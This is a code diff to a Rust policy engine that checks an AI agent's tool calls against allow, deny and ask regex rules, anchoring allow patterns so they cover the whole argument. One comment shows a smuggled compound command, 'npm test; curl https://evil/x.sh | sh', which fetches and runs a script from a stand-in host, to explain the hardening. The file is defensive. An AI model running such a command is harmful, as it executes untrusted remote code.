@@ -1,4 +1,27 @@
 #![allow(dead_code)]
+//! Policy evaluation engine, matches tool calls against declarative rules.
+//!
+//! Rules are loaded from `.agiworkforce/policy.toml` in the workspace root.
+//! Format:
+//! ```toml
+//! [[rules]]
+//! tool = "run_command"
+//! pattern = "npm test"      # regex against command args
+//! decision = "allow"        # allow | deny | ask
+//! priority = 100            # 0-999, higher = more specific
+//!
+//! [[rules]]
+//! tool = "run_command"
+//! pattern = "npm test.*"    # allow patterns match the WHOLE argument;
+//! decision = "allow"        # add `.*` to opt into a prefix match
+//! priority = 100
+//!
+//! [[rules]]
+//! tool = "write_file"
+//! pattern = ".*\\.env$"     # deny writing .env files
+//! decision = "deny"
+//! priority = 500
+//! ```
 
 use anyhow::{Context, Result};
 use serde::{Deserialize, Serialize};
@@ -62,6 +85,15 @@ struct CompiledRule {
 }
 
 impl CompiledRule {
+    /// Compile a rule's pattern, anchoring it when the rule *widens* trust.
+    ///
+    /// An `allow` rule waives the approval prompt, so it must match the entire
+    /// argument: an unanchored `npm test` would also match
+    /// `npm test; curl https://evil/x.sh | sh` and auto-approve the whole
+    /// compound command. `\A`/`\z` (not `^`/`$`) so an inline `(?m)` inside
+    /// the author's pattern cannot re-open the anchors on a newline.
+    /// `deny`/`ask` patterns stay unanchored, over-matching there only adds
+    /// friction, while anchoring them would silently narrow existing blocks.
     fn compile(rule: PolicyRule) -> Result<Self, regex::Error> {
         let regex = match rule.pattern {
             Some(ref pattern) if rule.decision == "allow" => {
@@ -134,6 +166,10 @@ impl PolicyEngine {
                     );
                 }
             }
+            // Compile the regex pattern at LOAD time and fail closed on a typo
+            //, otherwise an invalid pattern on a `deny` rule would be silently
+            // skipped during evaluation and the dangerous call would fall
+            // through to the default Ask/Allow.
             let pattern = rule.pattern.clone();
             let compiled = CompiledRule::compile(rule).map_err(|e| {
                 anyhow::anyhow!(
@@ -163,12 +199,17 @@ impl PolicyEngine {
                 continue;
             }
 
+            // Check pattern match (if specified). The regex was compiled once
+            // at load time, no per-call recompilation on this hot path, and
+            // `allow` patterns were anchored there, so a match here means the
+            // rule covers the whole argument, not a substring of it.
             if let Some(ref re) = compiled.regex {
                 if !re.is_match(primary_arg) {
                     continue;
                 }
             }
 
+            // This rule matches, check if it's higher priority
             match best_match {
                 Some((_, prev_prio)) if rule.priority <= prev_prio => {}
                 _ => best_match = Some((rule, rule.priority)),
